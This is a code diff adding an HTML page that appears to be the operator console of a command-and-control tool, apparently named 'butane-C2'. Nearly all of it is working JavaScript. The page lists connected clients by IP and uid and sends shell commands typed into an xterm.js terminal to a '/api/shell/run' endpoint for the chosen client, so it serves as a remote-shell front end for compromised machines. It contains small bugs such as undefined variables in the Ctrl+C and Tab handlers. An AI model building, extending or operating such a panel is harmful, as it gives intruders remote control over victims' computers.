@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<head>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xterm/3.14.5/xterm.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.7.0/lib/xterm-addon-fit.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@4.19.0/css/xterm.css" />
+    <style>
+        body {
+            background-color: #121212;
+        }
+
+        h1,h2,h3,h4,h5,h6,ul,li,span,text,textarea {
+            color: #f0f0f0;
+            font-family: monospace;
+        }
+
+        .box {
+            width: 98vw;
+            height: 100vh;
+        }
+
+
+
+    </style>
+</head>
+<body>
+    <div id="terminal" class="box"></div>
+
+    <script>
+        var xhr = new XMLHttpRequest();
+        var jsonData = 0
+        var command = ""
+        var disableTerm = false
+
+        var term = new window.Terminal({
+            cursorBlink: true,
+            convertEol: true,
+            cols: Math.floor(document.getElementById("terminal").offsetWidth / 12),
+            rows: Math.floor(document.getElementById("terminal").offsetHeight / 19),
+        });
+
+        window.addEventListener('resize', () => {
+            const cols = Math.floor(document.getElementById("terminal").offsetWidth / 12);
+            const rows = Math.floor(document.getElementById("terminal").offsetHeight / 19);
+            term.resize(cols, rows);
+        });
+
+        String.prototype.formatUnicorn = String.prototype.formatUnicorn ||
+        function () {
+            "use strict";
+            var str = this.toString();
+            if (arguments.length) {
+                var t = typeof arguments[0];
+                var key;
+                var args = ("string" === t || "number" === t) ?
+                    Array.prototype.slice.call(arguments)
+                    : arguments[0];
+
+                for (key in args) {
+                    str = str.replace(new RegExp("\\{" + key + "\\}", "gi"), args[key]);
+                }
+            }
+
+            return str;
+        };
+
+        function gup( name, url ) {
+            if (!url) url = location.href;
+            name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+            var regexS = "[\\?&]"+name+"=([^&#]*)";
+            var regex = new RegExp( regexS );
+            var results = regex.exec( url );
+            return results == null ? null : results[1];
+        }
+    </script>
+
+    <script>
+        function runCommand(terminal, cmd) {
+            var xhr = new XMLHttpRequest();
+            disableTerm = true
+            xhr.open('POST', '/api/shell/run', true);
+            xhr.onload = function() {
+                terminal.write("\r\n")
+                terminal.write(xhr.responseText)
+                terminal.write("\r\n")
+                terminal.write('\r\n$ ');
+                disableTerm = false
+            };
+
+            xhr.send(JSON.stringify({
+                "uid": gup('uid', false),
+                "command": cmd
+            }));
+        }
+
+        xhr.onload = function() {
+            jsonData = JSON.parse(xhr.responseText)[gup('uid', false)]
+
+            term.open(document.getElementById('terminal'));
+            // cool banner = hacker
+            term.write(`            
+     _           _                          _____  ____
+    | |         | |                        /  __ \\/__  \\
+    | |__  _   _| |_ __ _ _ __   ___ ______| /  \\/  / /
+    | '_ \\| | | | __/ _  | '_ \\ / _ \\______| |     / /  
+    | |_) | |_| | || (_| | | | |  __/      | \\__/\\/ /__
+    |_.__/ \\__,_|\\__\\__,_|_| |_|\\___|       \\____/\\____/
+            `)
+            term.write('\r\n    connected to {ip} ({uid})\r\n'.formatUnicorn({
+                "ip": jsonData["ip"], 
+                "uid": gup('uid', false)
+                }));
+            term.write('\r\n$ ');
+
+            term.onData(e => {
+                switch (e) {
+                    case '\u0003': // Ctrl+C
+                        term.write('^C');
+                        command = '';
+                        terminal.write('\r\n$ ');
+                        break;
+                    case '\r': // Enter
+                        runCommand(term, command);
+                        command = '';
+                        break;
+                    case '\u007F': // Backspace (DEL)
+                        // Do not delete the prompt
+                        if (term._core.buffer.x > 2) {
+                            term.write('\b \b');
+                            if (command.length > 0) {
+                                command = command.substr(0, command.length - 1);
+                            }
+                        }
+                        break;
+                    case '\u0009':
+                        console.log('tabbed', output, ["dd", "ls"]);
+                        break;
+                    default:
+                        if (e >= String.fromCharCode(0x20) && e <= String.fromCharCode(0x7E) || e >= '\u00a0') {
+                            if (!disableTerm) {
+                                command += e;
+                                term.write(e);
+                            }
+                        }
+                }
+            });
+        };
+
+        xhr.open('GET', '/api/data/clients', true);
+        xhr.send();
+    </script>
+
+    <script>
+        String.prototype.formatUnicorn = String.prototype.formatUnicorn ||
+        function () {
+            "use strict";
+            var str = this.toString();
+            if (arguments.length) {
+                var t = typeof arguments[0];
+                var key;
+                var args = ("string" === t || "number" === t) ?
+                    Array.prototype.slice.call(arguments)
+                    : arguments[0];
+
+                for (key in args) {
+                    str = str.replace(new RegExp("\\{" + key + "\\}", "gi"), args[key]);
+                }
+            }
+
+            return str;
+        };
+    </script>
+</body>
